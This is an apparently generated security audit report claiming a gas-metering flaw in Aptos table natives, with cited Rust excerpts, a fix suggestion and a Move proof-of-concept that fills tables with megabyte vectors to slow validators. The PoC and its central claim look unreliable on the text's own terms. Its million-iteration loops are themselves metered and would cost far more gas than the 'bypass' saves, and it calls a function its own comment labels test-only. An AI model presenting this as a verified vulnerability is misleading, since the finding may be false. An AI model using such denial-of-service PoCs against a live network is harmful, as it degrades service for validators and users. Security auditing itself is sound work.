# Audit Report

## Title
Table Native Function Gas Bypass: Value Serialization Cost Not Charged in `native_add_box()`

## Summary
The `native_add_box()` function only charges gas for key serialization but not for value serialization, allowing attackers to force validators to perform expensive BCS serialization of large values while paying minimal gas during native function execution. The value serialization occurs later in `into_change_set()` after the gas meter is no longer accessible.

## Finding Description

The table native implementation contains a gas accounting flaw where CPU costs for value serialization are not properly charged during native function execution. [1](#0-0) 

In `native_add_box()`, only the **key** is serialized and charged: [2](#0-1) 

The value is stored as a `Value` object without serialization at line 428. The actual value serialization happens later when `into_change_set()` is called during session finalization: [3](#0-2) 

The critical issue is that `finish()` has no access to a gas meter, making it impossible to charge for serialization work performed in `into_change_set()`: [4](#0-3) 

The serialization work happens in `serialize_value()`: [5](#0-4) 

**Attack Scenario:**
1. Attacker creates a table with `Table<u8, vector<u8>>`
2. Calls `add_box()` with key = `1` (1 byte) and value = `vector::empty<u8>` filled with 1MB of data
3. Native function charges: BASE (4411) + 36 * 1 = 4,447 internal gas for key serialization
4. Validator must later serialize 1MB value during `into_change_set()` with no additional native function gas charged
5. Only storage fees (charged separately) account for the stored size, not the CPU cost of BCS serialization

This breaks the **Resource Limits** invariant that "all operations must respect gas, storage, and computational limits" - specifically, the computational cost of value serialization is not properly metered in the native function that triggers it.

## Impact Explanation

**Medium Severity** - This qualifies as validator node slowdown per the Aptos bug bounty criteria:

- Attackers can craft transactions forcing disproportionate CPU work (BCS serialization of megabyte-scale values) while paying minimal native function gas
- The gas parameters show serialization should cost 36 internal gas per byte, but this only applies to keys
- While storage fees eventually charge for stored bytes, the CPU serialization work occurs in a non-metered context
- Repeated exploitation could cause validator performance degradation through CPU exhaustion
- Does not cause consensus failures or fund loss, but degrades network performance [6](#0-5) 

## Likelihood Explanation

**High Likelihood:**
- Exploitable by any transaction sender with no special privileges
- Simple to execute: create table and call `add()` with small key and large value  
- No prerequisites beyond transaction submission capability
- Attack is economically viable as storage fees don't fully compensate for CPU serialization cost discrepancy
- Can be repeated across multiple transactions to amplify impact

## Recommendation

The native function should serialize and charge for the value size before storing it, or alternatively, account for value size in gas calculation:

**Option 1: Serialize value during native call**
```rust
fn native_add_box(...) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    // ... existing code ...
    
    let key_bytes = serialize_key(&function_value_extension, &table.key_layout, &key)?;
    let key_cost = ADD_BOX_PER_BYTE_SERIALIZED * NumBytes::new(key_bytes.len() as u64);
    
    // ADD: Serialize value to calculate cost
    let val_layout = &table.value_layout_info.layout;
    let val_bytes_len = get_serialized_size(&function_value_extension, &val, val_layout)?;
    let val_cost = ADD_BOX_PER_BYTE_SERIALIZED * NumBytes::new(val_bytes_len as u64);
    
    // ... rest of function ...
    
    context.charge(key_cost + val_cost)?;
    // ...
}
```

**Option 2: Add abstract size estimation**
Add a method to estimate serialized size without full serialization, then charge accordingly.

## Proof of Concept

```move
module attacker::gas_bypass_exploit {
    use std::vector;
    use aptos_std::table;
    
    public entry fun exploit_table_gas_bypass(attacker: &signer) {
        // Create table with tiny key, large value capacity
        let t = table::new<u8, vector<u8>>();
        
        // Create 1MB payload
        let large_value = vector::empty<u8>();
        let i = 0;
        while (i < 1_000_000) {
            vector::push_back(&mut large_value, 0xFF);
            i = i + 1;
        };
        
        // Add to table - only pays for 1 byte key serialization
        // but forces validator to serialize 1MB value later
        table::add(&mut t, 1u8, large_value);
        
        // Repeat to amplify impact
        let key = 2u8;
        while (key < 100u8) {
            let payload = vector::empty<u8>();
            let j = 0;
            while (j < 1_000_000) {
                vector::push_back(&mut payload, 0xFF);
                j = j + 1;
            };
            table::add(&mut t, key, payload);
            key = key + 1;
        };
        
        // Drop table (test only) - in real attack, keep storing
        table::drop_unchecked(t);
    }
}
```

This PoC demonstrates forcing ~100MB of serialization work while paying native function gas for only 100 bytes of key serialization.

## Notes

The vulnerability exists in the Aptos-specific table natives implementation. While storage fees do charge for the final stored bytes, they don't compensate for the CPU cost differential where value serialization happens in a non-metered code path after `finish()` is called. The gas parameters explicitly define `per_byte_serialized` costs that should apply to both keys and values, but the implementation only applies them to keys.

### Citations

**File:** aptos-move/framework/table-natives/src/lib.rs (L386-444)
```rust
fn native_add_box(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    assert_eq!(ty_args.len(), 3);
    assert_eq!(args.len(), 3);

    context.charge(ADD_BOX_BASE)?;
    let fix_memory_double_counting =
        context.timed_feature_enabled(TimedFeatureFlag::FixTableNativesMemoryDoubleCounting);

    let (extensions, mut loader_context, abs_val_gas_params, gas_feature_version) =
        context.extensions_with_loader_context_and_gas_params();
    let table_context = extensions.get::<NativeTableContext>();
    let mut table_data = table_context.table_data.borrow_mut();

    let val = args.pop_back().unwrap();
    let key = args.pop_back().unwrap();
    let handle = get_table_handle(&safely_pop_arg!(args, StructRef))?;

    let table =
        table_data.get_or_create_table(&mut loader_context, handle, &ty_args[0], &ty_args[2])?;

    let function_value_extension = loader_context.function_value_extension();
    let key_bytes = serialize_key(&function_value_extension, &table.key_layout, &key)?;
    let key_cost = ADD_BOX_PER_BYTE_SERIALIZED * NumBytes::new(key_bytes.len() as u64);

    let (gv, loaded) =
        table.get_or_create_global_value(&function_value_extension, table_context, key_bytes)?;
    let mem_usage = if !fix_memory_double_counting || loaded.is_some() {
        gv.view()
            .map(|val| {
                abs_val_gas_params
                    .abstract_heap_size(&val, gas_feature_version)
                    .map(u64::from)
            })
            .transpose()?
    } else {
        None
    };

    let res = match gv.move_to(val) {
        Ok(_) => Ok(smallvec![]),
        Err(_) => Err(SafeNativeError::Abort {
            abort_code: ALREADY_EXISTS,
        }),
    };

    drop(table_data);

    // TODO(Gas): Figure out a way to charge this earlier.
    context.charge(key_cost)?;
    if let Some(amount) = mem_usage {
        context.use_heap_memory(amount)?;
    }
    charge_load_cost(context, loaded)?;

    res
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L680-702)
```rust
fn serialize_value(
    function_value_extension: &dyn FunctionValueExtension,
    layout_info: &LayoutInfo,
    val: &Value,
) -> PartialVMResult<(Bytes, Option<TriompheArc<MoveTypeLayout>>)> {
    let max_value_nest_depth = function_value_extension.max_value_nest_depth();
    let serialization_result = if layout_info.contains_delayed_fields {
        // Value contains delayed fields, so we should be able to serialize it.
        ValueSerDeContext::new(max_value_nest_depth)
            .with_delayed_fields_serde()
            .with_func_args_deserialization(function_value_extension)
            .serialize(val, layout_info.layout.as_ref())?
            .map(|bytes| (bytes.into(), Some(layout_info.layout.clone())))
    } else {
        // No delayed fields, make sure serialization fails if there are any
        // native values.
        ValueSerDeContext::new(max_value_nest_depth)
            .with_func_args_deserialization(function_value_extension)
            .serialize(val, layout_info.layout.as_ref())?
            .map(|bytes| (bytes.into(), None))
    };
    serialization_result.ok_or_else(|| partial_extension_error("cannot serialize table value"))
}
```

**File:** aptos-move/aptos-vm/src/move_vm_ext/session/mod.rs (L161-165)
```rust
    pub fn finish(
        self,
        configs: &ChangeSetConfigs,
        module_storage: &impl ModuleStorage,
    ) -> VMResult<VMChangeSet> {
```

**File:** aptos-move/aptos-vm/src/move_vm_ext/session/mod.rs (L220-223)
```rust
        let table_context: NativeTableContext = extensions.remove();
        let table_change_set = table_context
            .into_change_set(&function_extension)
            .map_err(|e| e.finish(Location::Undefined))?;
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/table.rs (L22-23)
```rust
        [add_box_base: InternalGas, "add_box.base", 4411],
        [add_box_per_byte_serialized: InternalGasPerByte, "add_box.per_byte_serialized", 36],
```
